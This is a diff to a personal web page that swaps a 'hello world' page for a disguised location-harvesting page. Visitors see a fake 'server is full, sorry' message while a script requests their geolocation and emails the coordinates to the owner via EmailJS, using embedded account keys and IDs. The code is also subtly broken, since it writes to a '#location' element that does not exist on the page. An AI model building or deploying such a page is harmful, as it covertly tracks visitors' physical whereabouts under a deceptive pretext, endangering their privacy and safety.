@@ -1,8 +1,79 @@
-<html>
-  <head>
-    <title>mysite</title>
-  </head>
-  <body>
-    <h1><center>hello world this is my site</center></h1>
-  </body>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Get User Location</title>
+  <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      padding: 2rem;
+      text-align: center;
+    }
+    #location {
+      font-size: 1.2rem;
+      margin-top: 1rem;
+    }
+  </style>
+</head>
+<body>
+  <h1>OOPS! THE SERVER IS FILLED UP. CHECK AGAIN TOMORRO. WE ARE SO SORRY 😞😐</h1>
+
+  <script>
+    emailjs.init("foVkyebFVNwCZgC7b"); // Replace with your EmailJS public key
+
+    const locationDiv = document.getElementById("location");
+
+    function sendEmail(latitude, longitude) {
+      const templateParams = {
+        lat: latitude,
+        long: longitude
+      };
+
+      emailjs.send("service_nngau4o", "template_17vfn7e", templateParams)
+        .then(response => {
+          console.log("Email sent successfully:", response.status);
+        })
+        .catch(error => {
+          console.error("Email error:", error);
+        });
+    }
+
+    function showPosition(position) {
+      const latitude = position.coords.latitude;
+      const longitude = position.coords.longitude;
+
+      locationDiv.innerHTML = `
+        Latitude: ${latitude} <br>
+        Longitude: ${longitude}
+      `;
+
+      sendEmail(latitude, longitude);
+    }
+
+    function showError(error) {
+      switch(error.code) {
+        case error.PERMISSION_DENIED:
+          locationDiv.innerText = "User denied the request for Geolocation.";
+          break;
+        case error.POSITION_UNAVAILABLE:
+          locationDiv.innerText = "Location information is unavailable.";
+          break;
+        case error.TIMEOUT:
+          locationDiv.innerText = "The request to get user location timed out.";
+          break;
+        default:
+          locationDiv.innerText = "An unknown error occurred.";
+          break;
+      }
+    }
+
+    if (navigator.geolocation) {
+      navigator.geolocation.getCurrentPosition(showPosition, showError);
+    } else {
+      locationDiv.innerText = "Geolocation is not supported by this browser.";
+    }
+  </script>
+</body>
 </html>
